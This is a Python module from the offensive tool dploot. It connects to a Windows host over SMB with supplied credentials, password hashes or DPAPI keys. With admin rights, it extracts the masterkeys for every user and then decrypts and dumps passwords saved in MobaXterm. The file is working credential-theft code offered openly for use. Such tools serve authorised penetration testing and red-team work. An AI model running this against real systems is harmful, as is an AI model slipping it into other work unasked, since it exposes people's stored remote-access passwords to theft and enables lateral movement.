import argparse
import logging
import sys
from typing import Callable, Tuple

from dploot.action.masterkeys import add_masterkeys_argument_group, parse_masterkeys_options
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.mobaxterm import MobaXtermTriage

NAME = 'mobaxterm'

class MobaXtermAction:

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)
        
        self.conn = None
        self._is_admin = None
        self._users = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(self.options, self.target)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s\n" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                if not self.options.quiet: 
                    for masterkey in self.masterkeys:
                        masterkey.dump()
                    print()
            
            triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            logging.info("Triage MobaXterm Secrets\n")
            _, credentials = triage.triage_mobaxterm()
            for credential in credentials:
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()
            
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MobaXtermAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump Passwords and Credentials from MobaXterm")

    group = subparser.add_argument_group("mobaxterm options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    add_masterkeys_argument_group(group)
    add_target_argument_group(subparser)

    return NAME, entry